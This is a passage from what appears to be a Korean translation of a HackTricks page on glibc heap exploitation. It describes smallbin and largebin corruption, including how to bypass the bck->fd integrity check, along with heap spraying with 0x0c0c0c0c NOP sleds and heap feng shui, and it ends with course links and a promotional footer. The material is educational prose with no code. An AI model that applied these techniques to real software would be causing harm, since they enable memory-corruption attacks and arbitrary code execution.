따라서 bin은 malloc()이 충분히 호출될 때까지 기다려야 하며, 수정된 bin이 다시 사용되고 bin을 속여 다음 조각이 가짜 주소에 있다고 믿게 해야 합니다. 그런 다음 원하는 조각이 제공됩니다.

취약점이 가능한 빨리 실행되도록하려면 다음이 이상적일 것입니다. 취약한 조각 예약, 수정될 조각 예약, 해당 조각 해제, 수정될 조각보다 큰 조각 예약, 조각 수정 (취약점), 취약한 조각과 동일한 크기의 조각 예약, 그리고 취약한 조각과 동일한 크기의 두 번째 조각 예약하고 이것이 선택한 주소를 가리키게 합니다.

이 공격을 방어하기 위해 "가짜" 조각이 아닌지를 확인하는 전형적인 확인이 사용됩니다: bck->fd가 victim을 가리키는지 확인합니다. 즉, 우리의 경우 스택에 가짜 조각을 가리키는 bck->fd 포인터가 victim을 가리키는지 확인합니다. 이 보호를 우회하려면 공격자는 어떤 방식으로든 (아마도 스택을 통해) 적절한 주소에 victim의 주소를 쓸 수 있어야 합니다. 그렇게 하면 진짜 조각처럼 보일 것입니다.

**LargeBin 손상**

이전과 동일한 요구 사항과 추가 요구 사항이 필요하며, 예약된 조각은 512보다 큰 크기여야 합니다.

공격은 이전과 같이 bk 포인터를 수정해야 하며, 모든 해당 malloc() 호출이 필요하지만 수정된 조각의 크기를 수정해야 합니다. 즉, size - nb가 < MINSIZE여야 합니다.

예를 들어, size를 1552로 설정하여 1552 - 1544 = 8 < MINSIZE가 되도록합니다 (부호 없는 값을 비교하므로 차이가 음수가 되면 안됨).

또한 더 복잡하게 만드는 패치가 도입되었습니다.

**힙 스프레이**

기본적으로 가능한 한 많은 힙 메모리를 예약하고, 이를 nops로 끝나는 셸코드로 채웁니다. 또한 셸코드로 0x0c를 사용합니다. 따라서 0x0c0c0c0c 주소로 점프하려고 시도하며, 따라서이 셀코드로 호출될 주소가 덮어써지면 해당 위치로 점프합니다. 기본적으로 전략은 가능한 한 많이 예약하여 어떤 포인터가 덮어써지는지 확인하고 0x0c0c0c0c로 점프하여 해당 위치에 nops가 있는지 확인하는 것입니다.

**힙 펑 수이**

힙을 예약하고 해제하여 예약된 조각과 해제된 조각 사이에 예약된 조각이 남도록 메모리를 정돈하는 것입니다. 오버플로우할 버퍼는 이러한 조각 중 하나에 위치합니다.

## 흥미로운 코스

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **참고 자료**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 제로에서 영웅까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 팔로우하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
